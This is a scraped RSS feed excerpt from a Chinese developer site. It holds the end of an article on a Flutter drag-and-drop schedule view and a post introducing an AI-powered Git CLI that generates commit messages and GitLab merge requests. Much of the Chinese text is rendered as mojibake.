    <span class="hljs-built_in">DateTime</span> newStartTime = widget.date.add(calculateOffsetHourMinute(correctedOffset).asDuration);
    widget.dragAndDropOptions!.onEventDragged(details.data, newStartTime);
    widget.timeRangeStartNotifier?.value = details.data.start;
    widget.timeRangeEndNotifier?.value = details.data.end;
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">æ›´æ–°UI</span></span></span>
    setState(() {
      reset();
      createEventsDrawProperties();
    });
  },
  onLeave: (event){
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">å¤„ç†æ‹–æ”¾ç¦»å¼€é€»è¾‘</span></span></span>
    <span class="hljs-keyword">if</span>(event!=<span class="hljs-keyword">null</span>) {
      widget.timeRangeStartNotifier?.value = event.start;
      widget.timeRangeEndNotifier?.value = event.end;
    }
  },
);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e831b256df3649919490fb1d25d6286e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=jeN6xqQo4lttthKUwSccvu3shmo%3D" alt="drag_drop.png" loading="lazy"/></p>
<h2 data-id="heading-6">åº”ç”¨åœºæ™¯ä¸ä»·å€¼</h2>
<p>è¯¥æŠ€æœ¯æ–¹æ¡ˆé€‚ç”¨äºå¤šç§éœ€è¦æ—¶é—´å¯è§†åŒ–çš„åœºæ™¯ï¼š</p>
<ul>
<li><strong>ä¼šè®®å®¤é¢„è®¢ç³»ç»Ÿ</strong>ï¼šç›´è§‚å±•ç¤ºä¼šè®®å®¤ä½¿ç”¨æƒ…å†µ</li>
<li><strong>ä¸ªäººæ—¥ç¨‹ç®¡ç†</strong>ï¼šæ¸…æ™°ç®¡ç†æ¯æ—¥ä»»åŠ¡å’Œæ´»åŠ¨</li>
<li><strong>é¡¹ç›®æ—¶é—´çº¿</strong>ï¼šå¯è§†åŒ–é¡¹ç›®è¿›åº¦å’Œé‡Œç¨‹ç¢‘</li>
</ul>
<h2 data-id="heading-7">Github</h2>
<p>æœ¬æ–‡ç›¸å…³çš„ä»£ç åŸºäº<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSkyost" target="_blank" title="https://github.com/Skyost" ref="nofollow noopener noreferrer">Skyost</a>çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSkyost%2FFlutterWeekView" target="_blank" title="https://github.com/Skyost/FlutterWeekView" ref="nofollow noopener noreferrer">FlutterWeekView</a>ä¿®æ”¹è€Œæ¥ï¼Œåœ°å€å¦‚ä¸‹ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkongpf8848%2Fflutter_schedule_view" target="_blank" title="https://github.com/kongpf8848/flutter_schedule_view" ref="nofollow noopener noreferrer">github.com/kongpf8848/â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ“¦ AI Git CLIï¼šè®© AI å¸®ä½ å†™ Commit å’Œ MR]]></title>    <link>https://juejin.cn/post/7600837236620312628</link>    <guid>https://juejin.cn/post/7600837236620312628</guid>    <pubDate>2026-01-30T08:29:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600837236620312628" data-draft-id="7600728866757754932" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ“¦ AI Git CLIï¼šè®© AI å¸®ä½ å†™ Commit å’Œ MR"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T08:29:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cecyci"/> <meta itemprop="url" content="https://juejin.cn/user/2356969294276701"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ“¦ AI Git CLIï¼šè®© AI å¸®ä½ å†™ Commit å’Œ MR
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2356969294276701/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cecyci
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:29:28.000Z" title="Fri Jan 30 2026 08:29:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€ç—›ç‚¹ï¼šé‡å¤è€Œæœºæ¢°çš„ Git å·¥ä½œæµ</h3>
<p>æ¯æ¬¡å¼€å‘æ–°éœ€æ±‚ï¼Œä½ æ˜¯å¦ä¹Ÿè¦é‡å¤è¿™ä¸€å¥—æµç¨‹ï¼Ÿ</p>
<ol>
<li>æ‹‰å–æœ€æ–°ä¸»åˆ†æ”¯</li>
<li>åˆ›å»ºæ–°åˆ†æ”¯Â <code>feat/xxx</code></li>
<li>å†™ä»£ç </li>
<li>æäº¤ï¼š</li>
</ol>
<pre><code class="hljs language-git" lang="git">git commit -m "feat: xxxxx"  # è¿˜å¾—æƒ³æ€ä¹ˆå†™
git push origin feat/xxx
</code></pre>
<ol start="5">
<li>å» GitLab æ‰‹åŠ¨æ–°å»º Merge Request</li>
<li>è¿˜å¯èƒ½éœ€ rebase ä¸»åˆ†æ”¯ï¼š</li>
</ol>
<pre><code class="hljs language-css" lang="css">git checkout <span class="hljs-selector-tag">main</span>
git pull origin <span class="hljs-selector-tag">main</span>
git checkout feat/xxx
git rebase <span class="hljs-selector-tag">main</span>
</code></pre>
<p>è¿™äº›æ“ä½œé‡å¤ã€çç¢ï¼Œä¸”Â <strong>Commit æ¶ˆæ¯å†™èµ·æ¥è´¹ç¥</strong>ï¼Œ<strong>MR æè¿°æ›´éš¾å†™å…¨é¢</strong>ã€‚</p>
<h3 data-id="heading-1">äºŒã€è§£å†³æ–¹æ¡ˆï¼šAIÂ CLI â€”â€” ä¸€æ¡é¾™è‡ªåŠ¨åŒ–</h3>
<p>å› æ­¤æˆ‘å¼€å‘äº†ä¸€ä¸ªÂ <strong>Git + AI å‘½ä»¤è¡Œå·¥å…·</strong>ï¼Œå¸®ä½ è‡ªåŠ¨åŒ–ä»¥ä¸Šæµç¨‹ï¼Œå¹¶è®© AI ç”Ÿæˆè§„èŒƒçš„ Commit å’Œ MR æè¿°ã€‚</p>

























<table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>ai git commit</code></td><td>rebase + commit + push + åˆ›å»º MR</td><td>å®Œæ•´æµç¨‹ï¼Œç¡®ä¿ä»£ç ä¸ä¸»åˆ†æ”¯åŒæ­¥</td></tr><tr><td><code>ai git mr</code></td><td>commit + push + åˆ›å»º MR</td><td>å·²æœ‰æœ¬åœ°æ›´æ”¹ï¼Œç›´æ¥æäº¤å¹¶æ MR</td></tr><tr><td><code>ai git add</code></td><td>add + commitï¼ˆå¯é€‰ pushï¼‰</td><td>ä»…æäº¤åˆ°æœ¬åœ°ï¼Œæš‚ä¸æ MR</td></tr></tbody></table>
<h3 data-id="heading-2">ä¸‰ã€æŠ€æœ¯å®ç°äº®ç‚¹</h3>
<h4 data-id="heading-3">Â 1. <strong>æ™ºèƒ½ç”Ÿæˆ Commit æ¶ˆæ¯</strong></h4>
<p>é€šè¿‡Â <code>git diff --cached</code>Â è·å–æš‚å­˜åŒºæ”¹åŠ¨ï¼Œå‘é€ç»™ AIï¼ˆä½¿ç”¨tokenè°ƒç”¨AIæ¥å£ï¼‰ï¼Œç”Ÿæˆç¬¦åˆÂ <strong>Conventional Commits</strong>Â æ ¼å¼çš„æ¶ˆæ¯ã€‚</p>
<p>prompt</p>
<pre><code class="hljs language-bash" lang="bash">è¯·åˆ†æä»¥ä¸‹ä»£ç æ”¹åŠ¨ï¼Œç”Ÿæˆä¸€ä¸ªç®€æ´çš„ commit messageï¼ˆæ ¼å¼ï¼š<span class="hljs-built_in">type</span>: descriptionï¼‰ã€‚

è¦æ±‚ï¼š
1. ä½¿ç”¨å¸¸è§çš„ commit <span class="hljs-built_in">type</span>ï¼ˆfeat, fix, docs, style, refactor, <span class="hljs-built_in">test</span>, choreï¼‰
2. æè¿°è¦ç®€æ´æ˜äº†ï¼Œä¸è¶…è¿‡ 50 ä¸ªå­—
3. åªè¾“å‡º commit messageï¼Œä¸è¦å…¶ä»–è¯´æ˜

ä»£ç æ”¹åŠ¨ï¼š<span class="hljs-variable">${diff}</span>
</code></pre>
<h4 data-id="heading-4">2.Â <strong>è‡ªåŠ¨åˆ›å»º MRï¼ˆä½¿ç”¨ GitLab CLIÂ <code>glab</code>ï¼‰</strong></h4>
<ul>
<li>æ£€æŸ¥æ˜¯å¦å·²æœ‰ MR</li>
<li>è·å–ä¸ä¸»åˆ†æ”¯çš„ diff å’Œ log</li>
<li>è°ƒç”¨ AI ç”ŸæˆÂ <strong>æ ‡é¢˜ + è¯¦ç»†æè¿°</strong>ï¼ˆå«æ”¹åŠ¨ç‚¹ã€å½±å“èŒƒå›´ã€é£é™©ï¼‰</li>
</ul>
<h4 data-id="heading-5">3.Â <strong>é˜²æ­¢ AI Token è¶…é™</strong></h4>
<ul>
<li>Commit æ—¶ï¼šå¯¹ diff é•¿åº¦æˆªæ–­</li>
<li>MR æ—¶ï¼šä»…æå–<strong>å…³é”®æ–‡ä»¶</strong>ï¼ˆæ–°å¢æ–‡ä»¶æˆ–ä¿®æ”¹å‡½æ•°è¶…è¿‡50è¡Œçš„æ–‡ä»¶ï¼‰</li>
</ul>
<h4 data-id="heading-6">4.Â <strong>å¥å£®çš„ Git æ“ä½œå°è£…</strong></h4>
<ul>
<li>è‡ªåŠ¨æ£€æµ‹ä¸»åˆ†æ”¯ï¼ˆmain/masterï¼‰</li>
<li>æ”¯æŒ stash â†’ rebase â†’ pop æµç¨‹ï¼Œå¤„ç†å†²çªä¸­æ–­</li>
<li>ä½¿ç”¨Â <code>git status --porcelain</code>Â è§£æçŠ¶æ€ï¼Œé¿å…äººå·¥è§£æè¾“å‡º</li>
</ul>
<h4 data-id="heading-7">5.Â <strong>å¤šç¯å¢ƒé…ç½®æ”¯æŒ</strong></h4>
<p>é€šè¿‡Â <code>dotenv</code>Â æŒ‰ä¼˜å…ˆçº§åŠ è½½Â <code>.env</code>Â æ–‡ä»¶ï¼Œæ–¹ä¾¿åœ¨ä¸åŒç›®å½•ä¸‹ä½¿ç”¨ã€‚</p>
<hr/>
<h3 data-id="heading-8">å››ã€ç¤ºä¾‹æµç¨‹</h3>
<h4 data-id="heading-9">ä½¿ç”¨Â <code>ai git commit</code>ï¼š</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. åœ¨ feat/0130 åˆ†æ”¯å¼€å‘å®Œæ¯•</span>
<span class="hljs-comment"># 2. ä¸€é”®å®Œæˆï¼š</span>
ai git commit --main-branch main

<span class="hljs-comment"># å·¥å…·ä¼šï¼š</span>
<span class="hljs-comment"># âœ… æ‹‰å–æœ€æ–° main</span>
<span class="hljs-comment"># âœ… stash â†’ rebase â†’ popï¼ˆå¦‚æœ‰å†²çªä¼šæš‚åœï¼‰</span>
<span class="hljs-comment"># âœ… è‡ªåŠ¨ add</span>
<span class="hljs-comment"># âœ… AI ç”Ÿæˆ commit messageï¼ˆå¯ç¼–è¾‘ç¡®è®¤ï¼‰</span>
<span class="hljs-comment"># âœ… æ¨é€åˆ†æ”¯</span>
<span class="hljs-comment"># âœ… åˆ›å»º MRï¼ˆAI ç”Ÿæˆæ ‡é¢˜å’Œæè¿°ï¼‰</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">äº”ã€é‡åˆ°çš„é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3>

























<table><thead><tr><th>é—®é¢˜</th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>AI token å¯èƒ½è¶…é™</td><td>å¯¹ diff æ™ºèƒ½æˆªæ–­ï¼Œåªæå–å…³é”®æ”¹åŠ¨</td></tr><tr><td>å†²çªå¤„ç†ä¸­æ–­æµç¨‹</td><td>é‡‡ç”¨ stash æœºåˆ¶ï¼Œå†²çªæ—¶ä¸­æ–­å¹¶æç¤ºç”¨æˆ·è§£å†³</td></tr><tr><td>ä¸åŒé¡¹ç›®ä¸»åˆ†æ”¯åä¸åŒ</td><td>æ”¯æŒÂ <code>--main-branch</code>Â å‚æ•°ï¼Œé»˜è®¤æ£€æµ‹Â <code>main</code>Â æˆ–Â <code>master</code></td></tr><tr><td>éœ€å…¼å®¹ä¸åŒ GitLab å®ä¾‹</td><td>ä½¿ç”¨Â <code>glab auth login</code>Â æå‰è®¤è¯ï¼Œæ”¯æŒè‡ªæ‰˜ç®¡ GitLab</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-11">å…­ã€æœªæ¥æ”¹è¿›æ–¹å‘</h3>
<ol>
<li><strong>äº¤äº’ç¡®è®¤</strong>ï¼šAI ç”Ÿæˆçš„ Commit å’Œ MR ä¿¡æ¯å¯ç¼–è¾‘åå†æäº¤</li>
<li><strong>æœ¬åœ°æ¨¡å‹æ”¯æŒ</strong>ï¼šæ¥å…¥ Ollamaï¼Œä¿æŠ¤ä»£ç éšç§ï¼Œå‡å°‘ API è°ƒç”¨æˆæœ¬</li>
<li><strong>å¤šå¹³å°æ”¯æŒ</strong>ï¼šé™¤äº† GitLabï¼Œä¹Ÿæ”¯æŒ GitHubï¼ˆé€šè¿‡Â <code>gh</code>Â CLIï¼‰</li>
<li><strong>Commit è§„èŒƒæ ¡éªŒ</strong>ï¼šåœ¨ AI ç”Ÿæˆåï¼Œè‡ªåŠ¨æ ¡éªŒæ˜¯å¦ç¬¦åˆå›¢é˜Ÿè§„èŒƒ</li>
<li><strong>å¯è§†åŒ–å†²çªè§£å†³</strong>ï¼šåœ¨ rebase å†²çªæ—¶æä¾›æ›´å‹å¥½çš„è§£å†³ç•Œé¢</li>
<li><strong>é”™è¯¯å¤„ç†ä¸å›æ»š</strong>ï¼šåœ¨ rebase æˆ– push å¤±è´¥æ—¶ï¼Œåº”æœ‰æ›´å®‰å…¨çš„å›æ»šæœºåˆ¶</li>
<li><strong>é…ç½®åŒ–</strong>ï¼šå…è®¸ç”¨æˆ·è‡ªå®šä¹‰ AI promptã€Commit ç±»å‹æ˜ å°„ç­‰</li>
<li><strong>è¿›åº¦æç¤º</strong>ï¼šé•¿æ—¶é—´æ“ä½œï¼ˆå¦‚ AI è°ƒç”¨ã€ç½‘ç»œè¯·æ±‚ï¼‰åº”æœ‰ loading æç¤º</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>